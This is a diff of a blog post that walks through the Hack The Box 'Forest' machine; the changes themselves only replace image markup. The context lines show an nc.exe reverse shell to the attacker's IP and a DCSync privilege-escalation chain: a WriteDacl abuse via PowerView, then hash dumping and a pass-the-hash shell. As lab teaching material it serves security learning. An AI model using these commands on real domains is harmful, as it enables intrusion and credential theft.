@@ -186,15 +186,15 @@ Session completed
 
 Armed with the password of `svc-alfresco`, we can attempt PowerShell Remoting through WinRM with a very nifty tool—[evil-winrm](https://github.com/Hackplayers/evil-winrm).
 
-<a class="image-popup">
-![248ee2c9.png](/assets/images/posts/forest-htb-walkthrough/248ee2c9.png)
-</a>
+
+{% include image.html image_alt="248ee2c9.png" image_src="/a7ce5de4-8c16-4379-9c8c-ac8ced7bbf15/248ee2c9.png" %}
+
 
 Bam. There you have it. The file `user.txt` is at `svc-alfresco`'s desktop.
 
-<a class="image-popup">
-![e0c63812.png](/assets/images/posts/forest-htb-walkthrough/e0c63812.png)
-</a>
+
+{% include image.html image_alt="e0c63812.png" image_src="/a7ce5de4-8c16-4379-9c8c-ac8ced7bbf15/e0c63812.png" %}
+
 
 Once we have this "shell", we can transfer `nc.exe` from Kali Linux for a more traditional shell.
 
@@ -203,9 +203,9 @@ Once we have this "shell", we can transfer `nc.exe` from Kali Linux for a more t
 *Evil-WinRM* PS C:\Users\svc-alfresco\appdata> start-process -filepath .\cute.exe -argumentlist "10.10.14.192 1234 -e cmd.exe" -nonewwindow
 ```
 
-<a class="image-popup">
-![d6903f9b.png](/assets/images/posts/forest-htb-walkthrough/d6903f9b.png)
-</a>
+
+{% include image.html image_alt="d6903f9b.png" image_src="/a7ce5de4-8c16-4379-9c8c-ac8ced7bbf15/d6903f9b.png" %}
+
 
 ## Privilege Escalation
 
@@ -218,15 +218,15 @@ PS C:\Users\svc-alfresco\appdata> Invoke-Bloodhound -CollectionMethod All -LDAPP
 
 I'll leave it as an exercise how to transfer the zipped JSON files over to your attacking machine for analysis.
 
-<a class="image-popup">
-![c39ad897.png](/assets/images/posts/forest-htb-walkthrough/c39ad897.png)
-</a>
+
+{% include image.html image_alt="c39ad897.png" image_src="/a7ce5de4-8c16-4379-9c8c-ac8ced7bbf15/c39ad897.png" %}
+
 
 Did you see it? Not only that, `svc-alfresco` has the power to create domain users as well!
 
-<a class="image-popup">
-![56d7c428.png](/assets/images/posts/forest-htb-walkthrough/56d7c428.png)
-</a>
+
+{% include image.html image_alt="56d7c428.png" image_src="/a7ce5de4-8c16-4379-9c8c-ac8ced7bbf15/56d7c428.png" %}
+
 
 
 With the WriteDacl permission, we can grant the newly created user with DCSync rights to dump the NTLM hashes. But first, we need enter into the **Exchange Trusted Subsystem** group.
@@ -237,9 +237,9 @@ PS C:\Users\svc-alfresco\appdata> Add-ADGroupMember -Identity "Exchange Trusted 
 
 This is important. We need to relogin to `svc-alfresco` for the group membership to take effect.
 
-<a class="image-popup">
-![b11bf806.png](/assets/images/posts/forest-htb-walkthrough/b11bf806.png)
-</a>
+
+{% include image.html image_alt="b11bf806.png" image_src="/a7ce5de4-8c16-4379-9c8c-ac8ced7bbf15/b11bf806.png" %}
+
 
 Next up, load up PowerView to grant `austin` his DCSync rights!
 
@@ -250,21 +250,21 @@ PS C:\Users\svc-alfresco\appdata> Add-DomainObjectAcl -TargetIdentity "DC=htb,DC
 
 With that, we should be able to dump the secrets with Impacket's `secretdump.py`.
 
-<a class="image-popup">
-![5f33bf31.png](/assets/images/posts/forest-htb-walkthrough/5f33bf31.png)
-</a>
+
+{% include image.html image_alt="5f33bf31.png" image_src="/a7ce5de4-8c16-4379-9c8c-ac8ced7bbf15/5f33bf31.png" %}
+
 
 Armed with the `administrator`'s hash, we can use Impacket's `smbexec.py` to get a privileged shell.
 
-<a class="image-popup">
-![72153db6.png](/assets/images/posts/forest-htb-walkthrough/72153db6.png)
-</a>
+
+{% include image.html image_alt="72153db6.png" image_src="/a7ce5de4-8c16-4379-9c8c-ac8ced7bbf15/72153db6.png" %}
+
 
 Getting `root.txt` is trivial.
 
-<a class="image-popup">
-![85476e0a.png](/assets/images/posts/forest-htb-walkthrough/85476e0a.png)
-</a>
+
+{% include image.html image_alt="85476e0a.png" image_src="/a7ce5de4-8c16-4379-9c8c-ac8ced7bbf15/85476e0a.png" %}
+
 
 :dancer:
 
